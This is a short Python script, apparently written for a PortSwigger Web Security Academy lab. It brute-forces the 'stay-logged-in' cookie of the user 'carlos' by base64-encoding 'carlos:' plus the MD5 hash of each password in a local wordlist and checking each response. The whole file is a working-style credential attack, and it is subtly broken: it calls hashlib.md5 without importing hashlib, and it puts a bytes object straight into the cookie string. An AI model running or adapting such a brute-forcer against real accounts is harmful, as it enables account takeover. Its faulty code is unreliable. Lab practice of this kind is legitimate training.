import requests, signal, sys, string, time, base64
from hashlib import md5
from pwn import *

#Variables Globales
URL = "https://0a87008103fa8a4bc2b5c6c000f800bb.web-security-academy.net/my-account"

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

def makeRequest(hash):
    payload = base64.b64encode(bytes("carlos:" + hash, encoding = "UTF-8"))
    r = requests.get(URL, headers = {"Cookie": "stay-logged-in=%s" % payload})
    return r

if __name__ == "__main__":
    p1 = log.progress("Iniciando proceso de fuerza bruta.")
    p2 = log.progress("stay-logged-in cookie: ")

    f = open("C:\\Users\\Arnau\\Desktop\\Programacion\\ProyectosPython\\herramientas\\passwords.txt")
    for i in f.readlines():
        password = bytes(i.strip(), encoding = "UTF-8")
        payload = hashlib.md5(password)
        r = makeRequest(payload.hexdigest())        
        if "Not found" not in r.text:
            p2.status(payload.hexdigest())
            
    
    